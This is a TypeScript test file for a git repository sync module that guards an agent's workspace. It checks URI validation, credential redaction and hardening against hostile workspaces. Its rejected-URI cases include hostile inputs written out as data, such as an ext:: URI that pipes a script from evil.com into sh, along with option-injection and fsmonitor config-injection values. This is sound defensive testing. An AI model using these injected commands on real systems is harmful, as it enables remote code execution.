import { execFileSync } from 'node:child_process';
import {
  appendFileSync,
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import type { PathLike } from 'node:fs';
import { join, relative } from 'node:path';
import { afterEach, beforeEach, describe, it, expect, vi } from 'vitest';

import {
  gitUriTransport,
  stripUrlCredentials,
  syncGitRepo,
  validateGitUri,
  type GitSyncResult,
} from '../src/cron/git-sync.js';
import {
  createGitSyncFixture,
  gitAtLeast,
  gitAvailable,
  posix,
  type GitSyncFixture,
} from './fixtures/git-sync-fixture.js';

/** Lets a test pretend the workspace is on another filesystem than the job directory. */
const crossDevice = vi.hoisted(() => ({ workspace: undefined as string | undefined, renamesRefused: 0 }));

/**
 * Lets a local repository (`localUrl`) answer for a remote URL (`url`) in the
 * sync's network steps, the only git commands that contact the remote:
 * `ls-remote` and `fetch` get `localUrl` in its place and the `file`
 * transport. Every other command, the agent's config writes included, runs
 * as the sync issued it. `served` lists the commands that were redirected.
 */
const remoteStandIn = vi.hoisted(() => ({
  url: undefined as string | undefined,
  localUrl: undefined as string | undefined,
  served: [] as string[],
}));

vi.mock('../src/security/git-hardening.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/security/git-hardening.js')>();
  const runGit: typeof actual.runGit = (args, options) => {
    const { url, localUrl } = remoteStandIn;
    const command = args.find((arg) => arg === 'ls-remote' || arg === 'fetch');
    if (url === undefined || localUrl === undefined || command === undefined || !args.includes(url)) {
      return actual.runGit(args, options);
    }
    remoteStandIn.served.push(command);
    return actual.runGit(
      args.map((arg) => (arg === url ? localUrl : arg)),
      { ...options, env: { ...options.env, GIT_ALLOW_PROTOCOL: 'file' } },
    );
  };
  return { ...actual, runGit };
});

vi.mock('node:fs/promises', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:fs/promises')>();
  const inside = (path: PathLike, dir: string): boolean => {
    const rel = relative(dir, String(path));
    return rel === '' || !rel.startsWith('..');
  };
  return {
    ...actual,
    rename: async (from: PathLike, to: PathLike): Promise<void> => {
      const workspace = crossDevice.workspace;
      if (workspace !== undefined && inside(from, workspace) !== inside(to, workspace)) {
        crossDevice.renamesRefused += 1;
        throw Object.assign(new Error(`EXDEV: cross-device link not permitted, rename '${String(from)}'`), {
          code: 'EXDEV',
        });
      }
      return actual.rename(from, to);
    },
  };
});

describe('validateGitUri', () => {
  describe('allowed protocols', () => {
    const validUris = [
      'https://github.com/org/repo.git',
      'http://github.com/org/repo.git',
      'ssh://git@github.com/org/repo.git',
      'git://github.com/org/repo.git',
      'file:///home/user/repo.git',
      'git@github.com:org/repo.git',
      'deploy@example.com:repos/myrepo.git',
      'HTTPS://GITHUB.COM/org/repo.git',
    ];

    for (const uri of validUris) {
      it(`accepts: ${uri}`, () => {
        expect(() => validateGitUri(uri)).not.toThrow();
      });
    }
  });

  describe('rejected protocols', () => {
    const dangerousUris = [
      'ext::sh -c whoami% >/tmp/pwned',
      'ext::sh -c curl http://evil.com/shell.sh | sh',
      'ext::some-command',
    ];

    for (const uri of dangerousUris) {
      it(`rejects ext:: protocol: ${uri}`, () => {
        expect(() => validateGitUri(uri)).toThrow(/disallowed protocol/);
      });
    }

    it('rejects unknown protocols', () => {
      expect(() => validateGitUri('ftp://example.com/repo.git')).toThrow(/disallowed protocol/);
    });

    it('rejects bare paths without file:// scheme', () => {
      expect(() => validateGitUri('/tmp/repo')).toThrow(/disallowed protocol/);
    });
  });

  it('rejects empty URI', () => {
    expect(() => validateGitUri('')).toThrow(/must not be empty/);
  });

  it('rejects whitespace-only URI', () => {
    expect(() => validateGitUri('   ')).toThrow(/must not be empty/);
  });

  it('trims whitespace before validation', () => {
    expect(() => validateGitUri('  https://github.com/repo.git  ')).not.toThrow();
  });

  it('rejects control characters anywhere in the URI', () => {
    for (const uri of [
      'https://github.com/org/repo.git\n[core]\n\tfsmonitor = x',
      'https://github.com/org/\trepo.git',
      'file:///tmp/repo\u0000',
      'https://github.com/org/repo\u007f.git',
      'https://github.com/org/repo\u0085.git',
    ]) {
      expect(() => validateGitUri(uri)).toThrow(/control characters/);
    }
  });

  it('rejects a URI that git or ssh could read as an option', () => {
    expect(() => validateGitUri('-oProxyCommand@host:repo.git')).toThrow(/must not start with "-"/);
    expect(() => validateGitUri('--upload-pack=touch@host:x')).toThrow(/must not start with "-"/);
  });
});

describe('stripUrlCredentials', () => {
  it('drops the whole userinfo of an http(s) URL', () => {
    expect(stripUrlCredentials('https://user:ghp_token@github.com/org/repo.git')).toBe(
      'https://github.com/org/repo.git',
    );
    expect(stripUrlCredentials('https://ghp_token@github.com/org/repo.git')).toBe('https://github.com/org/repo.git');
    expect(stripUrlCredentials('https://oauth2:glpat-token@gitlab.example.com/group/repo.git')).toBe(
      'https://gitlab.example.com/group/repo.git',
    );
    expect(stripUrlCredentials('HTTP://user:pw@example.com:8080/repo.git')).toBe('HTTP://example.com:8080/repo.git');
    expect(stripUrlCredentials('https://user:pw@[::1]:8443/repo.git')).toBe('https://[::1]:8443/repo.git');
    expect(stripUrlCredentials('https://user:pw@example.com')).toBe('https://example.com');
    expect(stripUrlCredentials('https://user:pw@example.com?ref=main')).toBe('https://example.com?ref=main');
    expect(stripUrlCredentials('https://@example.com/repo.git')).toBe('https://example.com/repo.git');
  });

  it('removes a password that contains a raw @ entirely', () => {
    expect(stripUrlCredentials('https://user:p@ss@example.com/repo.git')).toBe('https://example.com/repo.git');
    expect(stripUrlCredentials('ssh://git:p@ss@example.com/repo.git')).toBe('ssh://git@example.com/repo.git');
  });

  it('keeps the user name of any other URL and drops its password', () => {
    expect(stripUrlCredentials('ssh://git:hunter2@example.com/org/repo.git')).toBe(
      'ssh://git@example.com/org/repo.git',
    );
    expect(stripUrlCredentials('ssh://deploy:hunter2@example.com:2222/org/repo.git')).toBe(
      'ssh://deploy@example.com:2222/org/repo.git',
    );
    expect(stripUrlCredentials('git://anon:hunter2@example.com/repo.git')).toBe('git://anon@example.com/repo.git');
    expect(stripUrlCredentials('file://me:hunter2@localhost/srv/repo.git')).toBe('file://me@localhost/srv/repo.git');
    expect(stripUrlCredentials('ssh://:hunter2@example.com/repo.git')).toBe('ssh://example.com/repo.git');
  });

  it('strips the URL git uses, whatever whitespace surrounds it (validation and the sync trim it)', () => {
    for (const [uri, stripped] of [
      [' https://x-access-token:ghp_token@github.com/org/repo.git', 'https://github.com/org/repo.git'],
      ['\thttps://ghp_token@github.com/org/repo.git\n', 'https://github.com/org/repo.git'],
      ['\u00a0https://user:pw@example.com/repo.git', 'https://example.com/repo.git'],
      ['\nssh://deploy:hunter2@example.com/org/repo.git ', 'ssh://deploy@example.com/org/repo.git'],
      ['  git@github.com:org/repo.git  ', 'git@github.com:org/repo.git'],
    ]) {
      // Accepted as the job's gitRepo, so the sync and the generator's prompt use it.
      expect(() => validateGitUri(uri)).not.toThrow();
      expect(stripUrlCredentials(uri)).toBe(stripped);
    }
  });

  it('leaves a URL without credentials unchanged', () => {
    for (const uri of [
      'https://github.com/org/repo.git',
      'https://github.com/org/repo@v1.git',
      'https://github.com/org/repo.git?ref=a@b',
      'https://github.com/org/repo.git#a@b',
      'ssh://git@github.com/org/repo.git',
      'ssh://git@example.com/~user/repo.git',
      'git@github.com:org/repo.git',
      'file:///srv/repo.git',
    ]) {
      expect(stripUrlCredentials(uri)).toBe(uri);
    }
  });
});

describe('gitUriTransport', () => {
  it('allows exactly the transport the URI names', () => {
    expect(gitUriTransport('https://github.com/org/repo.git')).toBe('https');
    expect(gitUriTransport('HTTP://example.com/repo.git')).toBe('http');
    expect(gitUriTransport('ssh://git@github.com/org/repo.git')).toBe('ssh');
    expect(gitUriTransport('git@github.com:org/repo.git')).toBe('ssh');
    expect(gitUriTransport('git://example.com/repo.git')).toBe('git');
    expect(gitUriTransport('file:///srv/repo.git')).toBe('file');
  });
});

describe.skipIf(!gitAvailable || !posix)('syncGitRepo', () => {
  let f: GitSyncFixture;

  beforeEach(() => {
    f = createGitSyncFixture();
    f.commitUpstream({ 'README.md': 'readme\n', 'src/app.js': 'app\n', 'docs/guide.md': 'guide\n' }, 'one');
  });

  afterEach(() => {
    crossDevice.workspace = undefined;
    crossDevice.renamesRefused = 0;
    remoteStandIn.url = undefined;
    remoteStandIn.localUrl = undefined;
    remoteStandIn.served = [];
    f.cleanup();
  });

  async function sync(overrides: Parameters<GitSyncFixture['syncOptions']>[0] = {}): Promise<GitSyncResult> {
    return syncGitRepo(f.syncOptions(overrides));
  }

  async function syncOk(overrides: Parameters<GitSyncFixture['syncOptions']>[0] = {}) {
    const result = await sync(overrides);
    if (!result.ok) throw new Error(`sync failed: ${result.kind}: ${result.message}`);
    return result;
  }

  function expectTrackedFilesMatch(repo = f.upstream): void {
    for (const [path, content] of f.trackedFiles(repo)) {
      expect(readFileSync(join(f.workspace, path), 'utf8')).toBe(content);
    }
  }

  it('clones into a new job workspace and leaves the agent a working repository', async () => {
    const result = await syncOk();
    expect(result).toEqual({ ok: true, branch: 'main', commit: f.head(), discardedChanges: null, warnings: [] });
    expectTrackedFilesMatch();

    // The agent's .git: a normal clone layout, clean, tracking the job URL.
    expect(lstatSync(join(f.workspace, '.git')).isDirectory()).toBe(true);
    expect(f.git(f.workspace, 'status', '--porcelain', '--branch')).toBe('## main...origin/main\n');
    expect(f.git(f.workspace, 'config', '--get', 'remote.origin.url').trim()).toBe(f.uri);
    expect(f.git(f.workspace, 'rev-parse', 'HEAD', 'refs/remotes/origin/HEAD').trim().split('\n')).toEqual([
      f.head(),
      f.head(),
    ]);
    expect(existsSync(join(f.workspace, '.git', 'hooks'))).toBe(false);

    // The daemon-owned mirror sits outside the workspace; no staging is left behind.
    expect(f.git(f.root, '--git-dir', f.mirror, 'rev-parse', '--is-bare-repository').trim()).toBe('true');
    expect(f.git(f.root, '--git-dir', f.mirror, 'config', '--get', 'ironcurtain.url').trim()).toBe(f.uri);
    expect(f.git(f.root, '--git-dir', f.mirror, 'rev-parse', 'refs/ironcurtain/synced').trim()).toBe(f.head());
    expect(readdirSync(f.jobDir).sort()).toEqual(['repo.git', 'workspace']);
  });

  it('hard-resets tracked files, deletes files dropped upstream and keeps untracked files', async () => {
    await syncOk();
    writeFileSync(join(f.workspace, 'README.md'), 'agent edit\n');
    writeFileSync(join(f.workspace, 'last-run.md'), 'summary\n');
    mkdirSync(join(f.workspace, 'notes'));
    writeFileSync(join(f.workspace, 'notes', 'n.md'), 'note\n');
    f.commitUpstream({ 'docs/guide.md': null, 'src/app.js': 'app v2\n', 'src/new.js': 'new\n' }, 'two');

    await syncOk();
    expectTrackedFilesMatch();
    expect(existsSync(join(f.workspace, 'docs', 'guide.md'))).toBe(false);
    expect(readFileSync(join(f.workspace, 'last-run.md'), 'utf8')).toBe('summary\n');
    expect(readFileSync(join(f.workspace, 'notes', 'n.md'), 'utf8')).toBe('note\n');
    expect(f.git(f.workspace, 'status', '--porcelain')).toBe('?? last-run.md\n?? notes/\n');
  });

  it('reports only the agent edits as discarded, never upstream changes', async () => {
    await syncOk();
    writeFileSync(join(f.workspace, 'src', 'app.js'), 'agent\n');
    rmSync(join(f.workspace, 'docs', 'guide.md'));
    f.commitUpstream({ 'README.md': 'readme v2\n' }, 'two');

    const result = await syncOk();
    expect(result.discardedChanges).toMatch(/src\/app\.js/u);
    expect(result.discardedChanges).toMatch(/docs\/guide\.md/u);
    expect(result.discardedChanges).not.toMatch(/README/u);
    expect(readFileSync(join(f.workspace, 'docs', 'guide.md'), 'utf8')).toBe('guide\n');

    const again = await syncOk();
    expect(again.discardedChanges).toBeNull();
  });

  it('does not wedge when the agent and upstream changed the same file', async () => {
    await syncOk();
    writeFileSync(join(f.workspace, 'README.md'), 'agent version\n');
    f.commitUpstream({ 'README.md': 'upstream version\n' }, 'two');
    await syncOk();
    expect(readFileSync(join(f.workspace, 'README.md'), 'utf8')).toBe('upstream version\n');

    writeFileSync(join(f.workspace, 'README.md'), 'agent again\n');
    f.commitUpstream({ 'README.md': 'upstream again\n' }, 'three');
    await syncOk();
    expectTrackedFilesMatch();
  });

  it('re-clones the mirror when the job URL changes', async () => {
    await syncOk();
    writeFileSync(join(f.workspace, 'last-run.md'), 'summary\n');
    const other = f.createRepository('other', { 'OTHER.md': 'other\n', 'src/app.js': 'other app\n' });

    const result = await syncOk({ uri: `file://${other}` });
    expect(result.commit).toBe(f.head(other));
    expectTrackedFilesMatch(other);
    // Files only the previous repository tracked are gone; untracked ones stay.
    expect(existsSync(join(f.workspace, 'README.md'))).toBe(false);
    expect(existsSync(join(f.workspace, 'docs', 'guide.md'))).toBe(false);
    expect(readFileSync(join(f.workspace, 'last-run.md'), 'utf8')).toBe('summary\n');
    expect(f.git(f.root, '--git-dir', f.mirror, 'config', '--get', 'ironcurtain.url').trim()).toBe(`file://${other}`);
    expect(() => f.git(f.root, '--git-dir', f.mirror, 'cat-file', '-e', `${f.head()}^{commit}`)).toThrow();
    expect(f.git(f.workspace, 'config', '--get', 'remote.origin.url').trim()).toBe(`file://${other}`);
  });

  it("follows the upstream's default branch", async () => {
    f.git(f.upstream, 'checkout', '-q', '-b', 'trunk');
    f.commitUpstream({ 'TRUNK.md': 'trunk\n' }, 'trunk only');
    const first = await syncOk();
    expect(first.branch).toBe('trunk');
    expect(f.git(f.workspace, 'status', '--porcelain', '--branch')).toBe('## trunk...origin/trunk\n');

    f.git(f.upstream, 'checkout', '-q', 'main');
    const second = await syncOk();
    expect(second).toMatchObject({ branch: 'main', commit: f.head(), discardedChanges: null });
    expect(existsSync(join(f.workspace, 'TRUNK.md'))).toBe(false);
    expect(f.git(f.workspace, 'rev-parse', '--abbrev-ref', 'HEAD').trim()).toBe('main');
    expect(f.git(f.workspace, 'branch', '-r', '--format=%(refname:short)').split('\n').sort()).toEqual(
      ['', 'origin', 'origin/main', 'origin/trunk'].sort(),
    );
  });

  it('takes over a managed workspace left by the old in-place clone without running its config', async () => {
    mkdirSync(f.workspace, { recursive: true });
    f.git(f.root, 'clone', '-q', f.uri, f.workspace);
    appendFileSync(join(f.workspace, '.git', 'config'), `[core]\n\tfsmonitor = "${f.touch('legacy')}; false"\n`);
    writeFileSync(join(f.workspace, 'README.md'), 'stale edit\n');

    const result = await syncOk();
    expect(f.markersCreated()).toEqual([]);
    expect(result.discardedChanges).toBeNull();
    expect(result.warnings).toEqual([expect.stringMatching(/no previous sync is recorded/u)]);
    expectTrackedFilesMatch();
    expect(readFileSync(join(f.workspace, '.git', 'config'), 'utf8')).not.toContain('fsmonitor');
  });

  it('refuses to take over a user-supplied workspace that is not empty', async () => {
    const userDir = join(f.root, 'projects', 'mine');
    mkdirSync(userDir, { recursive: true });
    f.git(f.root, 'init', '-q', userDir);
    writeFileSync(join(userDir, 'work.txt'), 'precious\n');
    f.git(userDir, 'add', 'work.txt');
    f.git(userDir, 'commit', '-q', '-m', 'mine');
    const userHead = f.head(userDir);

    const result = await sync({ workspaceDir: userDir, managedWorkspace: false });
    expect(result).toMatchObject({ ok: false, kind: 'sync_error' });
    expect(result.ok ? '' : result.message).toMatch(/is not empty and was not populated by IronCurtain/u);
    expect(f.head(userDir)).toBe(userHead);
    expect(readFileSync(join(userDir, 'work.txt'), 'utf8')).toBe('precious\n');
    expect(existsSync(f.mirror)).toBe(false);
  });

  it('syncs an empty user-supplied workspace and keeps syncing it once it is populated', async () => {
    const userDir = join(f.root, 'projects', 'job-space');
    mkdirSync(userDir, { recursive: true });
    await syncOk({ workspaceDir: userDir, managedWorkspace: false });
    writeFileSync(join(userDir, 'README.md'), 'agent\n');
    f.commitUpstream({ 'src/app.js': 'app v2\n' }, 'two');

    const result = await syncOk({ workspaceDir: userDir, managedWorkspace: false });
    expect(result.discardedChanges).toMatch(/README\.md/u);
    expect(readFileSync(join(userDir, 'src', 'app.js'), 'utf8')).toBe('app v2\n');
    expect(readFileSync(join(userDir, 'README.md'), 'utf8')).toBe('readme\n');
  });

  it('fails without touching the workspace or the mirror when the upstream is unreachable', async () => {
    await syncOk();
    writeFileSync(join(f.workspace, 'README.md'), 'agent\n');
    const missing = `file://${join(f.root, 'does-not-exist')}`;

    const result = await sync({ uri: missing });
    expect(result).toMatchObject({ ok: false, kind: 'sync_error' });
    expect(result.ok ? '' : result.message).toMatch(/^querying file:\/\//u);
    expect(readFileSync(join(f.workspace, 'README.md'), 'utf8')).toBe('agent\n');
    expect(f.git(f.root, '--git-dir', f.mirror, 'config', '--get', 'ironcurtain.url').trim()).toBe(f.uri);
  });

  it('rejects an invalid URI before creating anything', async () => {
    const result = await sync({ uri: 'ext::sh -c touch% /tmp/pwned' });
    expect(result).toMatchObject({ ok: false, kind: 'sync_error' });
    expect(result.ok ? '' : result.message).toMatch(/disallowed protocol/u);
    expect(existsSync(f.jobDir)).toBe(false);
  });

  it('refuses a mirror inside the workspace', async () => {
    const result = await sync({ mirrorDir: join(f.workspace, 'repo.git') });
    expect(result).toMatchObject({ ok: false, kind: 'sync_error' });
    expect(result.ok ? '' : result.message).toMatch(/must be outside the workspace/u);
  });

  it('redacts URL credentials in failure messages', async () => {
    const result = await sync({ uri: 'https://user:hunter2@127.0.0.1:9/repo.git' });
    expect(result.ok).toBe(false);
    expect(result.ok ? '' : result.message).not.toContain('hunter2');
    expect(result.ok ? '' : result.message).toContain('https://<redacted>@127.0.0.1:9/repo.git');
  });

  /** Files under `dir` whose bytes contain `secret`, relative to `dir`. */
  function filesContaining(dir: string, secret: string): string[] {
    const hits: string[] = [];
    for (const entry of readdirSync(dir, { recursive: true, withFileTypes: true })) {
      if (!entry.isFile()) continue;
      const path = join(entry.parentPath, entry.name);
      if (readFileSync(path).includes(secret)) hits.push(relative(dir, path));
    }
    return hits;
  }

  it("keeps the token of an https job URL out of the agent's .git, fetching with it host-side", async () => {
    const uri = 'https://x-access-token:ghp_SyncTokenSecret@example.invalid/org/repo.git';
    // The upstream answers for the https URL (there is no network here).
    remoteStandIn.url = uri;
    remoteStandIn.localUrl = f.uri;

    const result = await syncOk({ uri });
    expect(result.commit).toBe(f.head());
    expectTrackedFilesMatch();
    expect(remoteStandIn.served).toEqual(['ls-remote', 'fetch']);
    expect(f.git(f.workspace, 'config', '--get', 'remote.origin.url').trim()).toBe(
      'https://example.invalid/org/repo.git',
    );
    expect(filesContaining(join(f.workspace, '.git'), 'ghp_SyncTokenSecret')).toEqual([]);
    // The daemon-owned mirror, never mounted, keeps the URL it fetches.
    expect(f.git(f.root, '--git-dir', f.mirror, 'config', '--get', 'ironcurtain.url').trim()).toBe(uri);

    // The next sync reuses the mirror for the same URL (no re-clone) and still keeps the token out.
    const mirrorInode = lstatSync(f.mirror).ino;
    f.commitUpstream({ 'README.md': 'readme v2\n' }, 'two');
    await syncOk({ uri });
    expect(lstatSync(f.mirror).ino).toBe(mirrorInode);
    expectTrackedFilesMatch();
    expect(filesContaining(join(f.workspace, '.git'), 'ghp_SyncTokenSecret')).toEqual([]);
  });

  it("keeps the user but not the password of an ssh job URL in the agent's origin remote", async () => {
    mkdirSync(join(f.root, 'bin'));
    const fakeSsh = join(f.root, 'bin', 'ssh');
    writeFileSync(fakeSsh, ['#!/bin/sh', `exec git upload-pack ${f.upstream}`, ''].join('\n'));
    chmodSync(fakeSsh, 0o755);
    const uri = 'ssh://deploy:SshPasswordSecret@example.invalid:2222/org/repo.git';

    await syncOk({ uri, baseEnv: { ...f.baseEnv, GIT_SSH_COMMAND: fakeSsh } });
    expectTrackedFilesMatch();
    expect(f.git(f.workspace, 'config', '--get', 'remote.origin.url').trim()).toBe(
      'ssh://deploy@example.invalid:2222/org/repo.git',
    );
    expect(filesContaining(join(f.workspace, '.git'), 'SshPasswordSecret')).toEqual([]);
    expect(f.git(f.root, '--git-dir', f.mirror, 'config', '--get', 'ironcurtain.url').trim()).toBe(uri);
  });

  it('runs concurrent syncs of the same job one after another', async () => {
    await syncOk();
    f.commitUpstream({ 'README.md': 'readme v2\n' }, 'two');
    const results = await Promise.all([sync(), sync(), sync()]);
    expect(results.map((result) => result.ok)).toEqual([true, true, true]);
    expectTrackedFilesMatch();
    expect(readdirSync(f.jobDir).sort()).toEqual(['repo.git', 'workspace']);
  });

  it('fetches over ssh in batch mode with no provider credentials, askpass or prompts in the environment', async () => {
    mkdirSync(join(f.root, 'bin'));
    const fakeSsh = join(f.root, 'bin', 'ssh');
    const log = join(f.root, 'ssh.log');
    const envDump = join(f.root, 'ssh.env');
    writeFileSync(
      fakeSsh,
      ['#!/bin/sh', `printf '%s\\n' "$*" >> ${log}`, `env > ${envDump}`, `exec git upload-pack ${f.upstream}`, ''].join(
        '\n',
      ),
    );
    chmodSync(fakeSsh, 0o755);

    const result = await syncOk({
      uri: 'git@example.invalid:org/repo.git',
      baseEnv: {
        ...f.baseEnv,
        GIT_SSH_COMMAND: fakeSsh,
        ANTHROPIC_API_KEY: 'sk-ant-secret',
        OPENAI_API_KEY: 'sk-openai-secret',
        CLAUDE_CODE_OAUTH_TOKEN: 'oauth-secret',
        ANTHROPIC_AUTH_TOKEN: 'auth-secret',
        GIT_ASKPASS: '/usr/bin/false',
        SSH_ASKPASS: '/usr/bin/false',
        GITHUB_TOKEN: 'kept-for-credential-helpers',
      },
    });
    expect(result.commit).toBe(f.head());
    expectTrackedFilesMatch();

    const environment = readFileSync(envDump, 'utf8');
    expect(environment).not.toMatch(/secret/u);
    expect(environment).not.toMatch(/^(GIT_ASKPASS|SSH_ASKPASS)=/mu);
    expect(environment).toMatch(/^GIT_TERMINAL_PROMPT=0$/mu);
    expect(environment).toMatch(/^GIT_ALLOW_PROTOCOL=ssh$/mu);
    expect(environment).toContain('GITHUB_TOKEN=kept-for-credential-helpers');
    for (const invocation of readFileSync(log, 'utf8').trim().split('\n')) {
      expect(invocation).toContain('-o BatchMode=yes');
      expect(invocation).toContain('example.invalid');
    }
  });

  it.skipIf(!gitAtLeast(2, 42))('syncs a SHA-256 upstream', async () => {
    const sha256 = join(f.root, 'sha256');
    f.git(f.root, 'init', '-q', '-b', 'main', '--object-format=sha256', sha256);
    f.commitUpstream({ 'README.md': 'sha256\n' }, 'one', sha256);
    const result = await syncOk({ uri: `file://${sha256}` });
    expect(result.commit).toHaveLength(64);
    expectTrackedFilesMatch(sha256);
    expect(f.git(f.workspace, 'rev-parse', '--show-object-format').trim()).toBe('sha256');
    expect(f.git(f.workspace, 'status', '--porcelain')).toBe('');
  });

  it('installs the .git by copy when the workspace is on another filesystem, without following a planted symlink', async () => {
    await syncOk();
    const outside = f.createRepository('outside', { 'KEEP.md': 'keep\n' });
    rmSync(join(f.workspace, '.git'), { recursive: true, force: true });
    symlinkSync(join(outside, '.git'), join(f.workspace, '.git'));
    f.commitUpstream({ 'README.md': 'readme v2\n' }, 'two');

    // The sync works on canonical paths (on macOS the temp dir is /var -> /private/var).
    crossDevice.workspace = realpathSync(f.workspace);
    await syncOk();
    // Both cross-filesystem fallbacks ran: removing the old .git in place and installing by copy.
    expect(crossDevice.renamesRefused).toBe(2);
    expectTrackedFilesMatch();
    expect(lstatSync(join(f.workspace, '.git')).isDirectory()).toBe(true);
    expect(existsSync(join(outside, '.git', 'HEAD'))).toBe(true);
    expect(f.head(outside)).toMatch(/^[0-9a-f]{40}$/u);
    expect(readdirSync(f.workspace).filter((name) => name.startsWith('.ironcurtain-git-'))).toEqual([]);
    expect(f.git(f.workspace, 'status', '--porcelain')).toBe('');
  });

  it('keeps a hostile workspace from reaching the mirror through hard links', async () => {
    await syncOk();
    const agentObjects = execFileSync('find', [join(f.workspace, '.git', 'objects'), '-type', 'f'], {
      encoding: 'utf8',
    })
      .trim()
      .split('\n');
    expect(agentObjects.length).toBeGreaterThan(0);
    for (const path of agentObjects) {
      expect(lstatSync(path).nlink).toBe(1);
    }
  });
});
